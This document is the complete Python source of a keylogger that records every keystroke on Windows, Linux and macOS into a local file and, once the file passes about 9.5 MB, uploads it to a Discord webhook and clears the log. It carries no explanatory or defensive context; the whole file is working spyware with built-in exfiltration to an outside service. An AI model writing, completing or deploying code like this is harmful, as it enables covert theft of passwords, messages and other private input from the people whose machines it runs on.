import os
import sys
import threading
import time
import keyboard
import pynput
from dhooks import Webhook, File

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "main.txt")
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"
SIZE_LIMIT = 9.5 * 1024 * 1024

IS_WINDOWS = sys.platform.startswith("win")
IS_MAC = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")

def send_to_discord():
    try:
        hook = Webhook(WEBHOOK_URL)
        hook.send(file=File(LOG_FILE))
        open(LOG_FILE, "w").close()
    except Exception as e:
        pass

def log_keys():
    def on_press(event):
        with open(LOG_FILE, 'a') as file:
            file.write(event.name + "\n")
            file.flush()
            os.fsync(file.fileno())

        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= SIZE_LIMIT:
            send_to_discord()

        if event.name == "esc":
            sys.exit()

    def on_press_mac(key):
        try:
            with open(LOG_FILE, 'a') as file:
                file.write(f"{key}\n")
                file.flush()
                os.fsync(file.fileno())

            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= SIZE_LIMIT:
                send_to_discord()
        except Exception as e:
            pass

    if IS_WINDOWS or IS_LINUX:
        keyboard.hook(on_press)
        keyboard.wait()
    elif IS_MAC:
        listener = pynput.keyboard.Listener(on_press=on_press_mac)
        listener.start()
        listener.join()

def read_file():
    while True:
        try:
            with open(LOG_FILE, 'r') as file:
                if os.path.getsize(LOG_FILE) >= SIZE_LIMIT:
                    send_to_discord()
        except FileNotFoundError:
            time.sleep(1)

threading.Thread(target=log_keys, daemon=True).start()

try:
    read_file()
except KeyboardInterrupt:
    sys.exit()
